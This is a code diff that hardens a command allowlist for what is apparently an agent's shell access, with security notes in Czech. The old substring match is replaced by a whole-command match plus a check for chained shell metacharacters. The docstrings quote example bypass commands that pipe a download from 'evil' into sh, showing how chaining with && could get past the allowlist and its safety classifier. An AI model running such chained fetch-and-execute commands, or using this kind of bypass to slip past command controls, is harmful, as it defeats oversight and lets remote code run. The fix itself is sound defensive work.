@@ -410,15 +410,46 @@ def update_allowed_command(cmd_id, **kwargs):
             return False
 
 def check_command_allowed(command):
-    """Returns first matching allowed_command rule or None. Uses fnmatch glob patterns."""
+    """Returns first matching allowed_command rule or None. Uses fnmatch glob patterns.
+
+    BEZPEČNOST: porovnává se CELÝ příkaz, ne podřetězec. Dřívější fallback
+    `rule['pattern'] in command` znamenal, že allowlist šel obejít připojením
+    čehokoli přes && / | ('ss -tlnp && curl evil|sh' obsahuje 'ss -tlnp'),
+    čímž byl celý allowlist + safety klasifikátor neúčinný.
+    Legitimní compound pravidla (např. 'journalctl --rotate && journalctl
+    --vacuum-time=7d') fungují dál — matchují se jako celek.
+    """
     import fnmatch
+    cmd = (command or '').strip()
+    if not cmd:
+        return None
     for rule in list_allowed_commands():
         try:
-            if fnmatch.fnmatch(command, rule['pattern']) or rule['pattern'] in command:
+            pattern = (rule.get('pattern') or '').strip()
+            if not pattern:
+                continue
+            if cmd == pattern:
+                return rule
+            if fnmatch.fnmatch(cmd, pattern) and not _adds_shell_meta(cmd, pattern):
                 return rule
         except Exception:
             pass
     return None
+
+
+# Shell metaznaky, kterými lze zřetězit další příkaz
+_SHELL_META = ('&', '|', ';', '`', '$(', '\n', '>', '<')
+
+
+def _adds_shell_meta(cmd: str, pattern: str) -> bool:
+    """True pokud příkaz obsahuje shell metaznak, který v patternu není.
+
+    Glob '*' v pravidle ('systemctl restart *') má zastoupit jméno unitu, ne
+    libovolný shell — bez této kontroly by fnmatch propustil
+    'systemctl restart x && curl evil|sh'. Pravidla, která metaznaky legitimně
+    obsahují (např. 'du -sh /var/* | sort -rh | head -20'), fungují dál.
+    """
+    return any(m in cmd and m not in pattern for m in _SHELL_META)
 
 def register_new_agent(hostname, token, category=None, web_ui_url=None):
     now_str = datetime.now(timezone.utc).isoformat()
